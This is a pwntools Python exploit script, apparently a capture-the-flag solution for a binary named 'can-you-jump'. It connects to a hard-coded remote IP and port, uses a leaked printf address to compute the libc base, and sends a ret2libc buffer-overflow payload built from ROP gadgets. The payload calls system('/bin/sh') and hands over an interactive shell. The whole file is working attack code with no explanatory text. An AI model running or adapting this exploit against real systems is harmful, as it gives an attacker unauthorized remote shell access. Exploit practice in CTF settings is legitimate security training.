from pwn import *

binary = "can-you-jump"
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("libc-2.27.so")
elf = ELF(binary)

context.log_level = 'error'
context.binary = binary

#p = process(binary)
p = remote("34.141.31.183", 30217)

rop = ROP(libc)
pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
#print(hex(pop_rdi_ret))
ret = rop.find_gadget(["ret"]).address
#print(hex(ret))

print(p.recv(64))
#print(p.recv(64))
#exit(0)
printf_leak = int(p.recv(64).decode("utf-8").split(": ")[-1].replace("\n", ""), 0)
#print(hex(printf_leak))
printf_address_in_libc = printf_leak

#print(hex(printf_address_in_libc))
printf_offset_in_libc = libc.symbols["printf"]
#print(hex(printf_offset_in_libc))

libc_base_addr = printf_address_in_libc - printf_offset_in_libc
#print(hex(libc_base_addr))

libc.address = libc_base_addr
system_address_in_libc = libc.symbols["system"]
#print(hex(system_address_in_libc))

sh_address_in_libc = next(libc.search(b"/bin/sh\x00"))
#print(hex(sh_address_in_libc))

#print(hex(libc_base_addr + ret))
#print(hex(libc_base_addr + pop_rdi_ret))

#gdb.attach(p, "b vuln")

offset = 72
#payload = offset * b"A" + pack(ret) + pack(pop_rdi_ret) + pack(sh_address_in_libc) + pack(system_address_in_libc)

payload = offset * b"A" + pack(libc_base_addr + ret) + pack(libc_base_addr + pop_rdi_ret) + pack(sh_address_in_libc) + pack(system_address_in_libc) 

p.sendline(payload)


p.interactive()
